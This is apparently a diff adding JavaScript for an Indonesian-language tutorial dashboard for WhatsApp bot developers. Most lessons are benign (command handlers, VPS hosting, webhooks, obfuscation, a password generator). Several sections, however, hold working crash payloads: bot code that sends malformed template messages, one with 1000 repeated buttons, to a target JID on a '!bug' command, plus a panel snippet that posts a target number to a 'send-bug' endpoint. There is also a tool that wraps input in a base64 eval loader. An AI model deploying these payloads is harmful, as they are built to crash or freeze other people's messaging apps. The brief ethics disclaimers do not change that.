+    <p>Function bug adalah fungsi yang dibuat di bot untuk mengirim pesan khusus yang bisa bikin aplikasi WhatsApp atau Telegram target crash, lag, atau force close. Payload biasanya berisi struktur pesan JSON yang sengaja rusak atau aneh agar client gagal parsing.</p>
+
+    <h4>📂 Struktur Folder</h4>
+    <pre><code>
+/project/
+├── index.js
+├── functions/
+│   └── functionBug.js
+├── session/
+├── package.json
+    </code></pre>
+
+    <h4>🛠️ Contoh Function Bug (<code>functionBug.js</code>)</h4>
+    <pre><code>async function kirimFunctionBug(jid, sock) {
+  const bugPayload = {
+    viewOnceMessage: {
+      message: {
+        templateMessage: {
+          hydratedTemplate: {
+            hydratedContentText: '*⚠️ CRASH PAYLOAD TEST*',
+            hydratedButtons: [
+              {
+                quickReplyButton: {
+                  displayText: '💥 BUG!',
+                  id: 'bug_exploit'
+                }
+              }
+            ]
+          }
+        }
+      }
+    }
+  };
+  await sock.sendMessage(jid, bugPayload);
+}
+module.exports = kirimFunctionBug;
+    </code></pre>
+
+    <h4>🔗 Cara Pakai di <code>index.js</code></h4>
+    <pre><code>const kirimFunctionBug = require('./functions/functionBug');
+
+sock.ev.on('messages.upsert', async ({ messages }) => {
+  const msg = messages[0];
+  if (!msg.message) return;
+  const from = msg.key.remoteJid;
+  const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
+
+  if (text === '!bug') {
+    try {
+      await kirimFunctionBug(from, sock);
+      await sock.sendMessage(from, { text: 'Function bug berhasil dikirim!' });
+    } catch (e) {
+      console.error('Error kirim bug:', e);
+    }
+  }
+});
+    </code></pre>
+
+    <h4>⚠️ Peringatan dan Etika</h4>
+    <ul>
+      <li>Jangan gunakan untuk menjahili orang lain.</li>
+      <li>Gunakan hanya untuk testing, edukasi, atau debugging.</li>
+      <li>WhatsApp bisa update sistem dan bug bisa tidak bekerja lagi.</li>
+      <li>Gunakan payload dengan hati-hati agar bot tidak banned.</li>
+    </ul>
+  `,
+        handler: `
+    <h4>📚 Apa itu Command Handler?</h4>
+    <p>Command handler adalah sistem untuk mengelola dan mengeksekusi perintah (commands) yang dikirim pengguna ke bot. Dengan handler, kamu bisa pisah-pisah fungsi command jadi file atau modul berbeda agar rapi dan mudah dikembangkan.</p>
+
+    <h4>📂 Struktur Project dengan Command Handler</h4>
+    <pre><code>
+/project/
+├── commands/
+│   ├── ping.js
+│   └── help.js
+├── index.js
+├── package.json
+    </code></pre>
+
+    <h4>🛠️ Contoh File Command (ping.js)</h4>
+    <pre><code>module.exports = {
+  name: 'ping',
+  description: 'Menjawab pong sebagai balasan',
+  execute: async (msg, sock) => {
+    await sock.sendMessage(msg.key.remoteJid, { text: '🏓 Pong!' });
+  }
+};
+    </code></pre>
+
+    <h4>🧩 Contoh Implementasi Command Handler di <code>index.js</code></h4>
+    <pre><code>const fs = require('fs');
+const path = require('path');
+
+const commands = new Map();
+const commandsPath = path.join(__dirname, 'commands');
+const commandFiles = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
+
+for (const file of commandFiles) {
+  const command = require(path.join(commandsPath, file));
+  commands.set(command.name, command);
+}
+
+// Event pesan masuk
+sock.ev.on('messages.upsert', async ({ messages }) => {
+  const msg = messages[0];
+  if (!msg.message) return;
+
+  const from = msg.key.remoteJid;
+  const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
+  if (!text) return;
+
+  if (!text.startsWith('!')) return; // prefix "!"
+
+  const args = text.slice(1).trim().split(/ +/);
+  const commandName = args.shift().toLowerCase();
+
+  if (!commands.has(commandName)) return;
+
+  try {
+    await commands.get(commandName).execute(msg, sock);
+  } catch (error) {
+    console.error('Error executing command:', error);
+    await sock.sendMessage(from, { text: '⚠️ Error menjalankan command.' });
+  }
+});
+    </code></pre>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Dengan command handler, kamu bisa pisah fungsi command jadi file modular dan bot jadi lebih terstruktur, mudah dikembangkan, dan lebih mudah debug.</p>
+  `,
+        proteksi: `
+    <h4>🔒 Mengapa Script Perlu Dilindungi?</h4>
+    <p>Script yang kamu buat bisa saja dicuri, dibajak, atau di-crack oleh pihak lain. Oleh karena itu, penting untuk melindungi script agar tidak mudah dibajak, terutama jika kamu menjual atau mendistribusikan script tersebut.</p>
+
+    <h4>📌 Teknik Proteksi Umum</h4>
+    <ul>
+      <li><b>Obfuscation:</b> Mengacak kode sumber sehingga sulit dibaca dan dimengerti.</li>
+      <li><b>Minification:</b> Memperkecil ukuran kode dengan menghapus spasi, komentar, dan mengganti nama variabel jadi pendek.</li>
+      <li><b>Enkripsi File:</b> Menggunakan enkripsi pada file script dan mendekripsi secara runtime.</li>
+      <li><b>License Key:</b> Membuat mekanisme validasi lisensi untuk membatasi penggunaan.</li>
+      <li><b>Anti Debugging:</b> Menambahkan pengecekan agar script sulit di-debug dan di-trace.</li>
+    </ul>
+
+    <h4>🔧 Contoh Obfuscation Sederhana dengan javascript-obfuscator</h4>
+    <pre><code>npm install -g javascript-obfuscator
+
+// Jalankan di terminal
+javascript-obfuscator index.js --output index-obf.js --compact true --control-flow-flattening true
+    </code></pre>
+
+    <h4>⚠️ Catatan</h4>
+    <p>Proteksi tidak 100% aman, tapi bisa memperlambat pembajakan dan membuatnya sulit dimengerti.</p>
+
+    <h4>💡 Tips Tambahan</h4>
+    <ul>
+      <li>Jangan simpan kunci lisensi secara hardcode dalam script.</li>
+      <li>Update proteksi secara berkala mengikuti tren hacking terbaru.</li>
+      <li>Gunakan server untuk validasi lisensi agar lebih aman.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Melindungi script sangat penting untuk menjaga hak cipta dan keamanan aplikasi kamu. Gunakan obfuscation, enkripsi, dan license key sebagai langkah utama.</p>
+  `,
+        hosting: `
+    <h4>🚀 Apa Itu VPS?</h4>
+    <p>VPS (Virtual Private Server) adalah server virtual yang bisa kamu gunakan untuk menjalankan aplikasi, seperti bot WhatsApp, website, atau server game. VPS memberikan kontrol penuh layaknya server fisik, tapi dengan harga lebih terjangkau.</p>
+
+    <h4>📌 Kenapa Harus Hosting di VPS?</h4>
+    <ul>
+      <li>Server 24/7, bot atau website kamu online terus tanpa gangguan.</li>
+      <li>Kontrol penuh atas sistem operasi dan konfigurasi.</li>
+      <li>Bisa install software apa saja sesuai kebutuhan.</li>
+      <li>Skalabilitas lebih baik daripada shared hosting biasa.</li>
+    </ul>
+
+    <h4>🔧 Langkah-Langkah Hosting Bot di VPS</h4>
+    <ol>
+      <li><b>Beli VPS:</b> Pilih penyedia VPS seperti DigitalOcean, Vultr, Linode, atau provider lokal.</li>
+      <li><b>Login ke VPS:</b> Gunakan SSH dari terminal atau aplikasi seperti Termius. Contoh:
+      <pre><code>ssh root@IP_VPS_KAMU</code></pre></li>
+      <li><b>Update dan install Node.js:</b>
+      <pre><code>sudo apt update
+sudo apt install nodejs npm -y
+node -v
+npm -v</code></pre></li>
+      <li><b>Upload script bot ke VPS:</b> Pakai scp atau aplikasi SFTP seperti FileZilla atau WinSCP.</li>
+      <li><b>Jalankan bot:</b>
+      <pre><code>cd /path/script-bot
+npm install
+node index.js</code></pre></li>
+      <li><b>Gunakan Process Manager:</b> Supaya bot tetap berjalan walau SSH terputus, pakai PM2:
+      <pre><code>npm install -g pm2
+pm2 start index.js
+pm2 save
+pm2 startup</code></pre></li>
+      <li><b>Pantau dan restart otomatis:</b> PM2 bisa restart bot kalau error atau server restart.</li>
+    </ol>
+
+    <h4>💡 Tips</h4>
+    <ul>
+      <li>Gunakan firewall (ufw) untuk amankan VPS.</li>
+      <li>Backup script dan data secara rutin.</li>
+      <li>Update sistem dan Node.js secara berkala.</li>
+      <li>Gunakan domain dan SSL kalau buat website.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Hosting di VPS memberikan kebebasan dan kestabilan untuk jalankan bot atau aplikasi kamu. Dengan pengaturan yang tepat, VPS bisa jadi “rumah” bot kamu yang selalu online dan siap bekerja.</p>
+  `,
+        pterodactyl: `
+    <h4>📌 Apa itu Pterodactyl?</h4>
+    <p>Pterodactyl adalah panel kontrol open-source untuk mengelola server game dan aplikasi, termasuk bot. Panel ini memudahkan kamu mengelola VPS atau dedicated server lewat antarmuka web.</p>
+
+    <h4>🛠️ Fitur Utama</h4>
+    <ul>
+      <li>Manajemen server melalui UI web yang user-friendly.</li>
+      <li>Mendukung Docker container untuk isolasi aplikasi.</li>
+      <li>Pengaturan resource server (CPU, RAM, Storage).</li>
+      <li>Manajemen pengguna dan izin akses.</li>
+      <li>API untuk integrasi dengan sistem lain.</li>
+    </ul>
+
+    <h4>📋 Struktur Instalasi</h4>
+    <pre><code>
+/var/lib/pterodactyl/
+├── wings/      # daemon untuk menjalankan server
+├── panel/      # aplikasi web panel
+└── backups/    # cadangan server
+    </code></pre>
+
+    <h4>⚙️ Cara Install Singkat</h4>
+    <ol>
+      <li>Siapkan VPS Ubuntu 20.04 atau 22.04.</li>
+      <li>Update sistem: <code>sudo apt update && sudo apt upgrade -y</code></li>
+      <li>Install dependencies seperti Docker, Node.js, PHP, MySQL, Nginx.</li>
+      <li>Download dan konfigurasi Pterodactyl panel dan daemon wings.</li>
+      <li>Jalankan migrasi database dan setup webserver.</li>
+      <li>Login ke panel lewat browser dan buat server baru.</li>
+    </ol>
+
+    <h4>🔗 Link Resmi</h4>
+    <p><a href="https://pterodactyl.io" target="_blank" style="color:#00ccff;">https://pterodactyl.io</a></p>
+
+    <h4>💡 Tips</h4>
+    <ul>
+      <li>Selalu backup data server sebelum update.</li>
+      <liGunakan SSL (https) agar panel aman.</li>
+      <li>Pelajari dokumentasi resmi untuk konfigurasi lanjutan.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Pterodactyl adalah solusi panel manajemen server yang powerful dan fleksibel untuk kebutuhan bot dan game server kamu.</p>
+  `,
+        autodeploy: `
+    <h4>🚀 Apa Itu Auto Deploy Bot?</h4>
+    <p>Auto deploy bot artinya bot kamu akan otomatis update dan restart setiap kali kamu push perubahan ke GitHub. Ini bikin workflow kamu lebih cepat dan efisien, tanpa perlu masuk ke VPS manual.</p>
+
+    <h4>🔧 Apa yang Dibutuhkan?</h4>
+    <ul>
+      <li>GitHub Repository tempat bot kamu disimpan</li>
+      <li>VPS dengan akses root atau user biasa yang punya akses ke folder project</li>
+      <li>Script deploy</li>
+      <li>Server listener (misalnya pakai Express.js)</li>
+    </ul>
+
+    <h4>📁 Struktur Folder</h4>
+    <pre><code>
+/project-bot/
+├── deploy.sh
+├── listener.js
+├── index.js (bot utama)
+└── node_modules/
+    </code></pre>
+
+    <h4>📝 Contoh deploy.sh</h4>
+    <pre><code>
+#!/bin/bash
+cd /home/user/project-bot
+git pull origin main
+pm2 restart index.js
+    </code></pre>
+    <p>Script ini akan menarik update terbaru dari GitHub dan restart bot kamu via PM2.</p>
+
+    <h4>🧠 Listener Webhook (listener.js)</h4>
+    <pre><code>
+const express = require('express');
+const { exec } = require('child_process');
+const app = express();
+
+app.use(express.json());
+
+app.post('/webhook', (req, res) => {
+  console.log('Received webhook from GitHub');
+  exec('sh /home/user/project-bot/deploy.sh', (err, stdout, stderr) => {
+    if (err) {
+      console.error('Deploy failed:', err);
+      return res.status(500).send('Deploy failed');
+    }
+    console.log('Deploy success:', stdout);
+    res.send('Deploy success');
+  });
+});
+
+app.listen(3000, () => console.log('Webhook listener running'));
+    </code></pre>
+
+    <h4>🔗 Setting Webhook di GitHub</h4>
+    <ol>
+      <li>Buka repo kamu di GitHub</li>
+      <li>Masuk ke Settings → Webhooks</li>
+      <li>URL: <code>http://IP_VPS_KAMU:3000/webhook</code></li>
+      <li>Content type: application/json</li>
+      <li>Events: pilih <code>Just the push event</code></li>
+      <li>Click Add Webhook</li>
+    </ol>
+
+    <h4>✅ Selesai</h4>
+    <p>Setiap kamu push ke GitHub, server akan otomatis menerima webhook dan menjalankan <code>deploy.sh</code>. Praktis banget buat dev aktif.</p>
+  `,
+        jsonapi: `
+    <h4>📚 Apa itu JSON?</h4>
+    <p>JSON (JavaScript Object Notation) adalah format data yang paling populer untuk pertukaran data antar aplikasi, karena ringan dan mudah dibaca manusia maupun mesin.</p>
+
+    <h4>🔧 Struktur JSON</h4>
+    <pre><code>
+{
+  "nama": "Dev Zal",
+  "umur": 22,
+  "hobi": ["coding", "musik", "gaming"],
+  "aktif": true
+}
+    </code></pre>
+
+    <h4>🌐 Apa itu API?</h4>
+    <p>API (Application Programming Interface) adalah antarmuka yang memungkinkan aplikasi berkomunikasi satu sama lain. Dalam konteks web, API biasanya berupa endpoint HTTP yang menerima request dan mengembalikan response data (biasanya JSON).</p>
+
+    <h4>⚙️ Contoh API Sederhana dengan Express.js</h4>
+    <pre><code>
+const express = require('express');
+const app = express();
+
+app.use(express.json());
+
+app.get('/api/hello', (req, res) => {
+  res.json({ message: "Halo dari API Dev Zal!" });
+});
+
+app.post('/api/data', (req, res) => {
+  const data = req.body;
+  console.log('Data diterima:', data);
+  res.json({ status: "success", dataDiterima: data });
+});
+
+app.listen(3000, () => console.log('API berjalan di port 3000'));
+    </code></pre>
+
+    <h4>🔔 Apa itu Webhook?</h4>
+    <p>Webhook adalah mekanisme di mana satu aplikasi mengirim data secara otomatis ke aplikasi lain melalui HTTP POST saat suatu event terjadi. Misalnya, GitHub mengirim notifikasi ke server kamu saat ada push ke repository.</p>
+
+    <h4>📌 Cara Kerja Webhook</h4>
+    <ol>
+      <li>Aplikasi A mengirim data ke URL tertentu saat event terjadi.</li>
+      <li>Aplikasi B menerima data dan memprosesnya.</li>
+      <li>Aplikasi B merespon sesuai kebutuhan.</li>
+    </ol>
+
+    <h4>🔧 Contoh Webhook Listener dengan Express.js</h4>
+    <pre><code>
+const express = require('express');
+const app = express();
+
+app.use(express.json());
+
+app.post('/webhook', (req, res) => {
+  const payload = req.body;
+  console.log('Webhook diterima:', payload);
+  res.sendStatus(200);
+});
+
+app.listen(3000, () => console.log('Webhook listener berjalan di port 3000'));
+    </code></pre>
+
+    <h4>⚠️ Tips & Best Practices</h4>
+    <ul>
+      <li>Selalu validasi data yang diterima webhook.</li>
+      <li>Gunakan token rahasia untuk verifikasi webhook.</li>
+      <li>Jangan memproses data berat secara langsung, gunakan queue jika perlu.</li>
+      <li>Berikan respon cepat (status 200) agar webhook tidak timeout.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>JSON, API, dan webhook adalah pondasi komunikasi aplikasi modern. Dengan memahami ini, kamu bisa membangun sistem bot yang terintegrasi dan responsif dengan ekosistem lain.</p>
+  `,
+        obfuscate: `
+    <h4>📌 Apa itu Obfuscate?</h4>
+    <p>Obfuscate adalah proses mengubah kode sumber program menjadi bentuk yang sulit dimengerti manusia, tapi tetap bisa dijalankan oleh mesin. Tujuannya untuk melindungi kode dari pembajakan, pembacaan, atau modifikasi ilegal.</p>
+
+    <h4>🎯 Manfaat Obfuscate</h4>
+    <ul>
+      <li>Mengurangi risiko pembajakan dan plagiarisme kode.</li>
+      <li>Menyulitkan reverse engineering dan cracking.</li>
+      <li>Melindungi rahasia algoritma dan logika bisnis.</li>
+    </ul>
+
+    <h4>🛠️ Cara Obfuscate File JavaScript</h4>
+    <ol>
+      <li>Gunakan tools seperti <code>javascript-obfuscator</code> yang populer dan mudah dipakai.</li>
+      <li>Install via npm:</li>
+      <pre><code>npm install -g javascript-obfuscator</code></pre>
+      <li>Obfuscate file:</li>
+      <pre><code>javascript-obfuscator input.js --output output.js</code></pre>
+      <li>Tambahkan opsi seperti <code>--compact true</code> atau <code>--controlFlowFlattening true</code> untuk proteksi lebih kuat.</li>
+    </ol>
+
+    <h4>⚠️ Catatan Penting</h4>
+    <ul>
+      <li>Obfuscate tidak 100% aman, hanya menyulitkan pembaca kode.</li>
+      <li>Pastikan kode sudah diuji setelah obfuscate, karena proses ini bisa menyebabkan error jika ada syntax aneh.</li>
+      <li>Backup kode asli sebelum proses obfuscate.</li>
+    </ul>
+
+    <h4>🔐 Proteksi Tambahan</h4>
+    <p>Selain obfuscate, kamu bisa gunakan teknik proteksi lain:</p>
+    <ul>
+      <li>Minify kode untuk memperkecil ukuran sekaligus mengaburkan kode.</li>
+      <li>Enkripsi bagian tertentu menggunakan runtime decryption.</li>
+      <li>Gunakan license key dan validasi server untuk mengontrol penggunaan.</li>
+    </ul>
+
+    <h4>📦 Integrasi dalam Project</h4>
+    <p>Buat script build di <code>package.json</code> agar proses obfuscate otomatis saat deploy:</p>
+    <pre><code>
+"scripts": {
+  "build": "javascript-obfuscator src/index.js --output dist/index.js --compact true --controlFlowFlattening true"
+}
+    </code></pre>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Obfuscate dan proteksi file penting untuk menjaga keamanan kode, tapi harus dipadukan dengan teknik lain dan pengujian yang baik.</p>
+  `,
+        panelWeb: `
+    <h4>🖥️ Contoh Frontend JavaScript (app.js)</h4>
+    <pre><code>
+async function sendBug() {
+  const target = document.getElementById('target').value.trim();
+  const mode = document.getElementById('mode').value;
+
+  if (!target) {
+    alert('Isi nomor target dulu!');
+    return;
+  }
+
+  const res = await fetch('/api/send-bug', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ target, mode })
+  });
+
+  const data = await res.json();
+  alert(data.message);
+}
+    </code></pre>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Membuat website panel sendiri memberikan kemudahan untuk kontrol sistem secara visual dan terorganisir. Gunakan API untuk komunikasi frontend-backend agar sistem berjalan realtime dan mudah dikembangkan.</p>
+  `,
+        uploadVPS: `
+    <h4>📌 Pengantar</h4>
+    <p>Meng-upload file ke VPS sangat penting agar kamu bisa menjalankan script, mengupdate bot, atau menyimpan data yang dibutuhkan.</p>
+
+    <h4>🛠️ Metode Upload File ke VPS</h4>
+    <ol>
+      <li><strong>SSH dengan SCP (Secure Copy Protocol)</strong><br>
+      Cara mudah untuk transfer file lewat terminal (Linux, macOS, Windows dengan WSL atau Git Bash).</li>
+      <li><strong>FTP / SFTP</strong><br>
+      Menggunakan aplikasi FTP client seperti FileZilla, WinSCP, atau Cyberduck.</li>
+      <li><strong>Panel Hosting (misal Pterodactyl)</strong><br>
+      Banyak panel hosting menyediakan fitur upload langsung via browser.</li>
+    </ol>
+
+    <h4>🔧 Upload File dengan SCP</h4>
+    <p>Contoh perintah untuk upload file dari komputer lokal ke VPS:</p>
+    <pre><code>
+scp /path/ke/file.js user@ip-vps:/home/user/
+    </code></pre>
+    <p>Ganti <code>user</code> dengan username VPS, <code>ip-vps</code> dengan IP VPS kamu, dan sesuaikan path file dan tujuan.</p>
+
+    <h4>📂 Upload File dengan SFTP (FileZilla / WinSCP)</h4>
+    <ol>
+      <li>Buka aplikasi FTP client.</li>
+      <li>Masukkan host: IP VPS kamu, username, password, dan port SSH (biasanya 22).</li>
+      <li>Connect lalu drag & drop file dari lokal ke folder VPS yang diinginkan.</li>
+    </ol>
+
+    <h4>💡 Tips</h4>
+    <ul>
+      <li>Pastikan user VPS punya izin akses ke folder tujuan.</li>
+      <li>Gunakan private key SSH agar login lebih aman tanpa password.</li>
+      <li>Periksa permission file setelah upload, gunakan <code>chmod</code> jika perlu.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Upload file ke VPS adalah skill dasar yang wajib dikuasai developer. Gunakan metode sesuai kenyamanan dan kebutuhan kamu, dan pastikan koneksi SSH kamu aman.</p>
+  `,
+apaItuBug: `<h4>🧠 Pengertian</h4>
+<p><strong>Bug WhatsApp</strong> adalah celah atau kelemahan dalam sistem WhatsApp, baik dari sisi client (pengguna) maupun server (pusat), yang dapat dimanfaatkan untuk menghasilkan perilaku tidak normal, seperti crash, lag, hang, atau bahkan force close aplikasi. Bug ini biasanya ditemukan oleh developer, peretas etis, atau komunitas testing keamanan dan dapat digunakan untuk keperluan riset, edukasi, atau eksploitasi jika disalahgunakan.</p>`,
+  caraKerjaBug: `<h4>🔍 Mekanisme Kerja</h4>
+<p>Cara kerja bug WhatsApp umumnya memanfaatkan kelemahan sistem parsing (pemrosesan data) di aplikasi. WhatsApp mengandalkan struktur data tertentu (seperti JSON) untuk membaca dan menampilkan pesan. Jika data yang dikirimkan tidak sesuai dengan ekspektasi sistem—misalnya terlalu besar, berlapis-lapis, atau mengandung karakter tidak valid—maka akan menyebabkan parsing error, yang akhirnya memicu crash atau freeze pada aplikasi penerima.</p>
+
+<p>Contoh umum teknik ini adalah menggunakan <code>viewOnceMessage</code> yang dibungkus berlapis-lapis atau menanamkan ribuan tombol dalam satu pesan.</p>`,
+  jenisBug: `<h4>📚 Jenis-Jenis Bug WhatsApp</h4>
+<ul>
+  <li><strong>Crash Bug:</strong> Membuat aplikasi langsung tertutup saat membuka chat.</li>
+  <li><strong>Lag Bug:</strong> Membuat aplikasi sangat lambat saat membuka pesan.</li>
+  <li><strong>Freeze Bug:</strong> Layar aplikasi membeku saat memuat pesan atau file tertentu.</li>
+  <li><strong>ViewOnce Bug:</strong> Memaksa media sekali lihat menjadi bisa dilihat berulang kali.</li>
+  <li><strong>Document/Image Bug:</strong> File terlihat biasa namun memiliki struktur yang membebani parser.</li>
+</ul>`,
+  kenapaTerjadi: `<h4>❓ Mengapa Bug Bisa Terjadi?</h4>
+<p>Bug muncul karena adanya ketidaksempurnaan dalam logika pemrograman. WhatsApp, seperti aplikasi lainnya, memiliki batasan dalam hal pemrosesan data. Jika batas tersebut dilampaui atau dimanipulasi secara ekstrem, aplikasi tidak tahu bagaimana harus menangani input tersebut dan akhirnya error.</p>
+
+<p>Hal ini bisa disebabkan oleh:</p>
+<ul>
+  <li>Input data yang terlalu panjang atau kompleks</li>
+  <li>Struktur JSON bertingkat hingga ribuan layer</li>
+  <li>Penggunaan emoji, karakter spesial, atau unicode yang tidak kompatibel</li>
+  <li>Manipulasi field internal dalam pesan</li>
+</ul>`,
+  contohPayload: `<h4>💣 Contoh Payload Berbahaya</h4>
+<pre><code>
+// functionBug.js
+async function kirimBug(jid, sock) {
+  const bugPayload = {
+    viewOnceMessage: {
+      message: {
+        templateMessage: {
+          hydratedTemplate: {
+            hydratedContentText: '*⚠️ CRASH PAYLOAD TEST*',
+            hydratedButtons: new Array(1000).fill({
+              quickReplyButton: {
+                displayText: '💥 BUG!',
+                id: 'bug_exploit'
+              }
+            })
+          }
+        }
+      }
+    }
+  };
+  await sock.sendMessage(jid, bugPayload);
+}
+module.exports = kirimBug;
+</code></pre>
+<p>Payload di atas menggunakan tombol yang diulang hingga ribuan kali untuk menyebabkan beban berat saat WhatsApp mencoba mem-parsing.</p>`,
+  deteksiBug: `<h4>🕵️ Cara Mendeteksi Bug</h4>
+<p>Jika kamu curiga telah menerima bug, berikut gejala yang bisa dikenali:</p>
+<ul>
+  <li>WhatsApp force close saat membuka chat tertentu</li>
+  <li>Layar menjadi putih atau stuck di loading</li>
+  <li>Scrolling menjadi lambat bahkan freeze</li>
+  <li>Tidak bisa membuka media (gambar, dokumen)</li>
+  <li>Pesan berisi banyak emoji, simbol asing, atau karakter panjang</li>
+</ul>`,
+  perlindungan: `<h4>🛡️ Tips Perlindungan dari Bug</h4>
+<ul>
+  <li>Selalu gunakan versi terbaru WhatsApp</li>
+  <li>Jangan buka file/media dari orang asing atau grup tidak dikenal</li>
+  <li>Hapus chat yang mencurigakan lewat WhatsApp Web jika tidak bisa dibuka di HP</li>
+  <li>Gunakan aplikasi WhatsApp clone/MOD dengan fitur anti-crash (opsional)</li>
+  <li>Backup data secara rutin</li>
+</ul>`,
+  etika: `<h4>⚖️ Etika & Tanggung Jawab</h4>
+<p>Bug adalah celah teknis, namun penggunaannya harus penuh tanggung jawab. Menyebarkan atau menyerang pengguna lain dengan bug bisa melanggar hukum, seperti UU ITE di Indonesia. Gunakan pengetahuan ini untuk:</p>
+<ul>
+  <li>Testing keamanan pribadi</li>
+  <li>Riset pengembangan sistem</li>
+  <li>Edukasi dan pelatihan developer</li>
+</ul>
+<p>Jangan gunakan untuk iseng atau merugikan orang lain.</p>`,
+  perbedaanDevice: `<h4>📱 Perbedaan Efek Bug di Tiap Perangkat</h4>
+<ul>
+  <li><strong>Android Low-End:</strong> Rentan terhadap bug besar, mudah force close.</li>
+  <li><strong>Android High-End:</strong> Lebih kuat menahan bug tapi tetap bisa freeze.</li>
+  <li><strong>iPhone:</strong> Biasanya lebih stabil, tapi tetap bisa crash jika payload besar.</li>
+  <li><strong>WhatsApp Web:</strong> Paling tahan, cocok untuk mendeteksi dan menghapus bug.</li>
+</ul>`,
+  efektifitas2025: `<h4>📊 Efektivitas Bug di Tahun 2025</h4>
+<p>Seiring berjalannya waktu, WhatsApp terus memperbarui sistem parsing, keamanan, dan perlindungan terhadap pesan berbahaya. Di tahun 2025, sebagian besar bug klasik sudah tidak efektif lagi. Namun:</p>
+<ul>
+  <li>Bug baru tetap bisa muncul melalui fitur-fitur baru</li>
+  <li>Developer dan hacker etis masih menemukan celah-celah baru</li>
+  <li>Testing dan eksperimen tetap dibutuhkan untuk keamanan</li>
+</ul>`
+};
+      judul.textContent = daftarJudul[id] || "Materi";
+      konten.innerHTML = daftarKonten[id]
+        ? `<p>${daftarKonten[id]}</p>`
+        : `<p>(Penjelasan untuk <strong>${judul.textContent}</strong> belum tersedia.)</p>`;
+    }
+function bukaErrorChecker() {
+  document.getElementById("dashboard").style.display = "none";
+  document.getElementById("materiPage").style.display = "none";
+  document.getElementById("errorChecker").style.display = "block";
+}
+function bukaEncodeTools() {
+  document.getElementById("dashboard").style.display = "none";
+  document.getElementById("encodeTools").style.display = "block";
+}
+
+function kembaliDariEncodeTools() {
+  document.getElementById("encodeTools").style.display = "none";
+  document.getElementById("dashboard").style.display = "block";
+}
+
+function encodeText() {
+  const input = document.getElementById("inputText").value;
+  const encoded = btoa(unescape(encodeURIComponent(input)));
+  const wrapped = `eval(Buffer.from("${encoded}", "base64").toString())`;
+  document.getElementById("outputText").value = wrapped;
+}
+
+function decodeText() {
+  const input = document.getElementById("inputText").value;
+  try {
+    const decoded = decodeURIComponent(escape(atob(input)));
+    document.getElementById("outputText").value = decoded;
+  } catch (e) {
+    document.getElementById("outputText").value = "❌ Decode gagal! Pastikan teks benar.";
+  }
+}
+
+function resetText() {
+  document.getElementById("inputText").value = "";
+  document.getElementById("outputText").value = "";
+}
+
+function salinHasil() {
+  const output = document.getElementById("outputText").value;
+  if (!output) return alert("⛔ Belum ada hasil untuk disalin!");
+  navigator.clipboard.writeText(output).then(() => {
+    const notif = document.getElementById("notifSalin");
+    notif.textContent = "✅ Hasil disalin ke clipboard!";
+    setTimeout(() => notif.textContent = "", 2000);
+  });
+}
+
+function handleFile(event) {
+  const file = event.target.files[0];
+  const reader = new FileReader();
+  reader.onload = function(e) {
+    document.getElementById("inputText").value = e.target.result;
+  };
+  reader.readAsText(file);
+}
+function kembaliDariErrorChecker() {
+  document.getElementById("errorChecker").style.display = "none";
+  document.getElementById("dashboard").style.display = "block";
+}
+function bukaPasswordGenerator() {
+  document.getElementById("dashboard").style.display = "none";
+  document.getElementById("passwordGenerator").style.display = "block";
+}
+
+function kembaliDariPasswordGenerator() {
+  document.getElementById("passwordGenerator").style.display = "none";
+  document.getElementById("dashboard").style.display = "block";
+}
+
+function generatePassword() {
+  const length = parseInt(document.getElementById('length').value);
+  const includeUpper = document.getElementById('includeUpper').checked;
+  const includeNumbers = document.getElementById('includeNumbers').checked;
+  const includeSymbols = document.getElementById('includeSymbols').checked;
+
+  const lower = 'abcdefghijklmnopqrstuvwxyz';
+  const upper = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+  const numbers = '0123456789';
+  const symbols = '!@#$%^&*()_+[]{}<>?|';
+
+  let charset = lower;
+  if (includeUpper) charset += upper;
+  if (includeNumbers) charset += numbers;
+  if (includeSymbols) charset += symbols;
+
+  if (!charset) {
+    document.getElementById('passwordOutput').textContent = "❌ Pilih minimal satu opsi.";
+    return;
+  }
+
+  let password = '';
+  for (let i = 0; i < length; i++) {
+    const random = Math.floor(Math.random() * charset.length);
+    password += charset[random];
+  }
+
+  document.getElementById('passwordOutput').textContent = password;
+}
+
+function salinPassword() {
+  const output = document.getElementById('passwordOutput').textContent;
+  if (!output || output === "Password akan muncul di sini" || output.includes("❌")) return;
+
+  navigator.clipboard.writeText(output).then(() => {
+    alert("✅ Password berhasil disalin!");
+  });
+}
+  function bukaIPChecker() {
+    document.getElementById("dashboard").style.display = "none";
+    document.getElementById("ipChecker").style.display = "block";
+
+    document.getElementById("ua").textContent = "User Agent: " + navigator.userAgent;
+    const os = navigator.platform || "Tidak terdeteksi";
+    document.getElementById("os").textContent = "Sistem Operasi: " + os;
+    const browser = (() => {
+      const ua = navigator.userAgent;
+      if (ua.includes("Chrome")) return "Chrome";
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+      if (ua.includes("Edge")) return "Edge";
+      return "Tidak diketahui";
+    })();
+    document.getElementById("browser").textContent = "Browser: " + browser;
+
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        document.getElementById("ip").textContent = "IP: " + data.ip;
+      })
+      .catch(() => {
+        document.getElementById("ip").textContent = "IP: Gagal dimuat";
+      });
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(pos => {
+        const { latitude, longitude } = pos.coords;
+        document.getElementById("location").textContent = `Lokasi: Lat ${latitude.toFixed(4)}, Long ${longitude.toFixed(4)}`;
+      }, err => {
+        document.getElementById("location").textContent = "Lokasi: Tidak diizinkan";
+      });
+    } else {
+      document.getElementById("location").textContent = "Lokasi: Tidak didukung";
+    }
+  }
+
+  const kuisQuestions = [
